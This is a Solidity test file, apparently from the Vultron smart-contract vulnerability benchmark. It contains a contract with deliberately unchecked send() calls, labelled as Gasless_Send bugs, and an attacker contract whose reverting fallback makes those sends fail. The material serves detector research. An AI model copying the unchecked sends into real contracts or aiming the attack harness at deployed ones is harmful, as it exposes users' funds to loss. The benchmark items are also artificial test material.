/*
 * @source: https://github.com/ntu-SRSLab/vultron/blob/master/benchmark/gaslesssend/CreditDepositBank/
 * @author: Vultron
 * @vulnerable_at_lines: 18
 */

pragma solidity ^0.4.19;

import "/home/hjwang/Tools/ContraMaster/contracts/HFConditionalTransfer.sol";

contract HFConditionalTransfer {
    function transferIfHF(address to) payable {
        if (address(0xbf4ed7b27f1d666546e30d74d50d173d20bca754).balance > 1000000 ether)
            to.send(msg.value);
        else
            // <yes> <report> Gasless_Send
            msg.sender.send(msg.value);
    }

    function transferIfNoHF(address to) payable {
        if (address(0xbf4ed7b27f1d666546e30d74d50d173d20bca754).balance <= 1000000 ether)
            to.send(msg.value);
        else
            // <yes> <report> Gasless_Send
            msg.sender.send(msg.value);
    }
}

contract Attack_HFConditionalTransfer {

  HFConditionalTransfer public target_contract;

  function Attack_HFConditionalTransfer0(address _targetContract) public payable {
      target_contract = HFConditionalTransfer(_targetContract);
  } 

  function vultron_transferIfHF(uint256 vultron_amount, address to) public payable{
    target_contract.transferIfHF.value(vultron_amount)(to);
  } 

  function vultron_transferIfNoHF(uint256 vultron_amount, address to) public payable{
    target_contract.transferIfNoHF.value(vultron_amount)(to);
  } 

  function() public payable {
    revert();
  }
} 